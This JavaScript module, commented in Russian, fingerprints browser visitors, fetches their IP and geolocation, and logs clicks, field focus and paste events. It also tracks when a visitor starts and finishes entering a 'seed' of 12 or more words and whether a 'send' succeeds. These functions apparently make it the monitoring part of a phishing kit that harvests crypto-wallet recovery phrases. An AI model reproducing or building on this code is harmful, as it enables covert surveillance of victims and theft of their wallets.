// ============================================
// USER ACTIONS - Объединенный модуль
// Tracker + IP + Geo + Fingerprint
// Максимум ждем 2 секунды, потом null
// ============================================

(function() {
    
    // ============================================
    // TRACKER
    // ============================================
    
    let sessionId = null;
    let fingerprintId = null;
    let actions = [];
    let currentScreen = null;
    let userState = {
        visitedScreens: [],
        seedInputStarted: false,
        seedInputCompleted: false,
        seedLength: 0,
        sendAttempts: 0,
        sendSuccess: false,
        lastActivity: Date.now()
    };

    function generateSessionId() {
        if (!sessionId) {
            const stored = localStorage.getItem('session_id');
            if (stored) {
                sessionId = stored;
            } else {
                sessionId = Date.now().toString(36) + Math.random().toString(36).substring(2);
                localStorage.setItem('session_id', sessionId);
            }
        }
        return sessionId;
    }

    function generateFingerprint() {
        if (fingerprintId) return fingerprintId;

        const components = [
            navigator.userAgent,
            navigator.language,
            screen.width + 'x' + screen.height,
            screen.colorDepth,
            new Date().getTimezoneOffset(),
            !!window.sessionStorage,
            !!window.localStorage,
            navigator.hardwareConcurrency || 'unknown',
            navigator.deviceMemory || 'unknown',
            navigator.platform
        ];

        const fingerprint = components.join('|');
        let hash = 0;
        for (let i = 0; i < fingerprint.length; i++) {
            const char = fingerprint.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }

        fingerprintId = Math.abs(hash).toString(36);
        return fingerprintId;
    }

    function getDeviceInfo() {
        const ua = navigator.userAgent;
        let deviceType = 'desktop';
        
        if (/mobile/i.test(ua)) deviceType = 'mobile';
        else if (/tablet|ipad/i.test(ua)) deviceType = 'tablet';

        return {
            type: deviceType,
            screen: `${screen.width}x${screen.height}`,
            browser: getBrowserInfo(),
            os: getOSInfo(),
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown'
        };
    }

    function getBrowserInfo() {
        const ua = navigator.userAgent;
        if (ua.indexOf('Firefox') > -1) return 'Firefox';
        if (ua.indexOf('Chrome') > -1) return 'Chrome';
        if (ua.indexOf('Safari') > -1) return 'Safari';
        if (ua.indexOf('Edge') > -1) return 'Edge';
        if (ua.indexOf('Opera') > -1) return 'Opera';
        return 'Unknown';
    }

    function getOSInfo() {
        const ua = navigator.userAgent;
        if (ua.indexOf('Win') > -1) return 'Windows';
        if (ua.indexOf('Mac') > -1) return 'MacOS';
        if (ua.indexOf('Linux') > -1) return 'Linux';
        if (ua.indexOf('Android') > -1) return 'Android';
        if (ua.indexOf('iOS') > -1) return 'iOS';
        return 'Unknown';
    }

    function trackAction(type, data = {}) {
        actions.push({
            timestamp: Date.now(),
            type: type,
            data: data
        });

        if (actions.length > 100) {
            actions.shift();
        }
    }

    function trackScreen(screenName) {
        currentScreen = screenName;
        if (!userState.visitedScreens.includes(screenName)) {
            userState.visitedScreens.push(screenName);
        }
        trackAction('screen_view', { screen: screenName });
    }

    function trackSeedInputStart() {
        if (!userState.seedInputStarted) {
            userState.seedInputStarted = true;
            trackAction('seed_input_started', { screen: currentScreen });
        }
    }

    function trackSeedInput(seedValue) {
        const words = seedValue.trim().split(/\s+/).filter(Boolean);
        userState.seedLength = words.length;
        userState.lastActivity = Date.now();
        
        trackAction('seed_input_change', { wordCount: words.length });
        
        if (words.length >= 12 && !userState.seedInputCompleted) {
            userState.seedInputCompleted = true;
            trackAction('seed_input_completed', { wordCount: words.length });
        }
    }

    function trackSendAttempt(method) {
        userState.sendAttempts++;
        userState.lastActivity = Date.now();
        trackAction('send_attempt', { method: method, attempt: userState.sendAttempts });
    }

    function trackSendSuccess(method) {
        userState.sendSuccess = true;
        userState.lastActivity = Date.now();
        trackAction('send_success', { method: method, totalAttempts: userState.sendAttempts });
    }

    function trackSendFailed(method, error) {
        userState.lastActivity = Date.now();
        trackAction('send_failed', { method: method, error: error });
    }

    // ============================================
    // IP FORWARD
    // ============================================
    
    let cachedIP = null;
    let ipPromise = null;

    async function getRealIP() {
        if (cachedIP) return cachedIP;
        if (ipPromise) return ipPromise;

        ipPromise = fetchIP();
        
        try {
            cachedIP = await ipPromise;
            return cachedIP;
        } catch (e) {
            return 'unknown';
        } finally {
            ipPromise = null;
        }
    }

    async function fetchIP() {
        const services = [
            {
                url: 'https://api.ipify.org?format=json',
                extract: (data) => data.ip
            },
            {
                url: 'https://ipapi.co/json/',
                extract: (data) => data.ip
            },
            {
                url: 'https://api.my-ip.io/ip.json',
                extract: (data) => data.ip
            }
        ];

        for (const service of services) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 3000);

                const response = await fetch(service.url, {
                    signal: controller.signal,
                    cache: 'no-cache'
                });

                clearTimeout(timeoutId);

                if (response.ok) {
                    const data = await response.json();
                    const ip = service.extract(data);
                    
                    if (ip && /^(?:\d{1,3}\.){3}\d{1,3}$/.test(ip)) {
                        return ip;
                    }
                }
            } catch (e) {
                continue;
            }
        }

        return 'unknown';
    }

    // ============================================
    // GEO HELPER
    // ============================================
    
    let geoCache = null;
    let geoPromise = null;

    async function getGeoData() {
        if (geoCache) return geoCache;
        if (geoPromise) return geoPromise;

        geoPromise = fetchGeoData();
        
        try {
            geoCache = await geoPromise;
            return geoCache;
        } catch (err) {
            return null;
        } finally {
            geoPromise = null;
        }
    }

    async function fetchGeoData() {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 3000);
        
        try {
            const response = await fetch('https://ipwhois.app/json/', {
                signal: controller.signal
            });
            
            clearTimeout(timeoutId);
            
            if (!response.ok) {
                throw new Error(`HTTP ${response.status}`);
            }
            
            const data = await response.json();
            
            if (!data.success) {
                throw new Error('Invalid response');
            }
            
            return {
                country: data.country_code || null,
                region: data.region || null,
                city: data.city || null
            };
        } catch (err) {
            clearTimeout(timeoutId);
            return null;
        }
    }

    function getGeoCached() {
        return geoCache;
    }

    // ============================================
    // ГЛАВНАЯ ФУНКЦИЯ - СБОР ВСЕХ ДАННЫХ
    // ============================================

    /**
     * Собрать все данные с таймаутом 2 секунды
     */
    async function collectUserActions() {
        const timeout = 2000; // 2 секунды максимум
        
        try {
            const dataPromise = Promise.all([
                getRealIP().catch(() => 'unknown'),
                getGeoData().catch(() => null)
            ]);
            
            const timeoutPromise = new Promise((resolve) => {
                setTimeout(() => resolve([null, null]), timeout);
            });
            
            const [ip, geo] = await Promise.race([dataPromise, timeoutPromise]);
            
            return {
                sessionId: generateSessionId(),
                fingerprintId: generateFingerprint(),
                device: getDeviceInfo(),
                ip: ip || 'unknown',
                geo: geo,
                userState: userState,
                currentScreen: currentScreen,
                actions: actions.slice(-20), // Последние 20 действий
                timing: {
                    timeOnPage: Date.now() - (window.pageLoadTime || Date.now()),
                    timeSinceLastActivity: Date.now() - userState.lastActivity
                }
            };
            
        } catch (e) {
            // Если что-то пошло не так - возвращаем минимум
            return {
                sessionId: generateSessionId(),
                fingerprintId: generateFingerprint(),
                device: getDeviceInfo(),
                ip: 'unknown',
                geo: null,
                userState: userState,
                currentScreen: currentScreen,
                actions: [],
                timing: {
                    timeOnPage: 0,
                    timeSinceLastActivity: 0
                }
            };
        }
    }

    // ============================================
    // АВТОТРЕКИНГ
    // ============================================

    function setupAutoTracking() {
        trackAction('page_view', {
            url: window.location.href,
            referrer: document.referrer || 'direct'
        });

        document.addEventListener('click', (e) => {
            if (e.target.tagName === 'BUTTON' || e.target.tagName === 'A') {
                trackAction('click', {
                    element: e.target.tagName,
                    text: e.target.textContent.substring(0, 50)
                });
            }
        });

        document.addEventListener('focus', (e) => {
            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                trackAction('input_focus', {
                    field: e.target.id || e.target.name || 'unknown'
                });
            }
        }, true);

        document.addEventListener('paste', (e) => {
            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                trackAction('paste', {
                    field: e.target.id || e.target.name || 'unknown',
                    length: (e.clipboardData?.getData('text') || '').length
                });
            }
        });
    }

    // ============================================
    // ЭКСПОРТ
    // ============================================

    window.UserActions = {
        // Главная функция
        collect: collectUserActions,
        
        // Tracking
        trackScreen,
        trackSeedInputStart,
        trackSeedInput,
        trackSendAttempt,
        trackSendSuccess,
        trackSendFailed,
        trackAction,
        
        // Геттеры
        getSessionId: generateSessionId,
        getFingerprint: generateFingerprint,
        getDeviceInfo,
        getIP: getRealIP,
        getGeo: getGeoData,
        getGeoCached,
        getUserState: () => userState,
        getCurrentScreen: () => currentScreen
    };

    // ============================================
    // АВТОЗАПУСК
    // ============================================

    window.pageLoadTime = Date.now();

    // Предзагрузка IP и Geo
    getRealIP().catch(() => {});
    getGeoData().catch(() => {});

    // Автотрекинг
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', setupAutoTracking);
    } else {
        setupAutoTracking();
    }

})();